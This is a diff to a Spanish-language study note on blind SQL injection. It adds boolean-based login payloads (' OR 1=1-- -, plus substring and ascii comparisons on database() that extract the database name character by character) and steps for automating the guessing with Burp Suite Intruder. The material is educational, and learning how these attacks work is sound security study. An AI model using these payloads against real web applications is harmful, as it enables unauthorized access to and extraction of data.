@@ -21,9 +21,30 @@ En las inyecciones a ciegas, el resultado no se ve en la pantalla (son deductiva
 ### BOOLEAN
 Tiene un comportamiento verdadero o falso (0 o 1)
 
-User: ' OR 1=1-- -
-Pass: ' OR 1=1-- -
+|User: |' OR 1=1-- -|
+|----|-----|
+|Pass: |' OR 1=1-- -|
 
+|User: |' OR (substring(database(),1,1))='p' -- -|
+|-------|-------------|
+|Pass: |' OR (substring(database(),1,1))='p' -- -|
+
+|User: |' OR (ascii(substring(database(),1,1)))='45' -- -|
+|----|----|
+|Pass: |' OR (ascii(substring(database(),1,1)))='45' -- -|
+
+|User: |' OR (ascii(substring(database(),1,1)))>'45' -- -|
+|----|----|
+|Pass: |' OR (ascii(substring(database(),1,1)))>'45' -- -|
+
+Se puede automatizar con el BurpSuite:
+
+Intruder --> payloads (numero) --> 32-126 
+
+settings --> Redirections (always)
+
+
+---
 ### TIME
 Tiempo de carga (¿Cuanto demora en carga una página web?)
 ### OOB
